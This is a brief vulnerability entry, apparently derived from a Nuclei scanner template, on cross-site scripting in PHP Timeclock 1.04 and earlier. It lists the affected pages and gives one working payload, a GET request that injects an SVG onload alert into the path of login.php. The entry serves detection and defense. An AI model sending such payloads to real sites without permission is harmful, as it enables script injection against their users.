# Vulnerability: PHP Timeclock <=1.04 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`php-timeclock-xss.yaml`)

## Description
PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E
```

